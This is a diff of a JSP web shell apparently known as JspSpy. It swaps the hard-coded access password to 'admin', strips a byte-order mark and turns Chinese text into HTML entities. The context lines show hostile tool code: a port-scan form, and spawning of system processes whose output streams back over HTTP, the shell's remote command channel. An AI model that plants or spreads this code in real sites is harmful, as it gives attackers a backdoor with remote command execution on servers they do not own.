@@ -1,4 +1,4 @@
-﻿<%@page pageEncoding="utf-8"%>
+<%@page pageEncoding="utf-8"%>
 <%@page import="java.io.*"%>
 <%@page import="java.util.*"%>
 <%@page import="java.util.regex.*"%>
@@ -20,7 +20,7 @@
 * Blog http://www.Forjj.com/
 * Yue . I Love You.
 */
-private static final String PW = "ninty"; //password
+private static final String PW = "admin"; //password
 private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
 private static final String REQUEST_CHARSET = "ISO-8859-1";
 private static final String PAGE_CHARSET = "UTF-8";
@@ -718,7 +718,7 @@ out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\
 "<h2 id=\"Bin_H2_Title\">PortScan &gt;&gt;</h2>"+
 "<div id=\"YwLB\"><form action=\""+SHELL_NAME+"\" method=\"post\">"+
 "<p><input type=\"hidden\" value=\"portScan\" name=\"o\">"+
-"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout （秒） : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
+"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout &#65288;&#31186;&#65289; : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
 "</p>"+
 "</form></div>"+
 "</td></tr></table>");
@@ -2231,7 +2231,7 @@ OnLineProcess olp = new OnLineProcess(pro);
 JSession.setAttribute(SHELL_ONLINE,olp);
 new OnLineConnector(new ByteArrayInputStream(outs.toByteArray()),pro.getOutputStream(),"exeOclientR",olp).start();
 new OnLineConnector(pro.getInputStream(),response.getOutputStream(),"exeRclientO",olp).start();
-new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//错误信息流。
+new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//&#38169;&#35823;&#20449;&#24687;&#27969;&#12290;
 Thread.sleep(1000 * 60 * 60 * 24);
 } else if (type.equals("ecmd")) {
 Object o = JSession.getAttribute(SHELL_ONLINE);
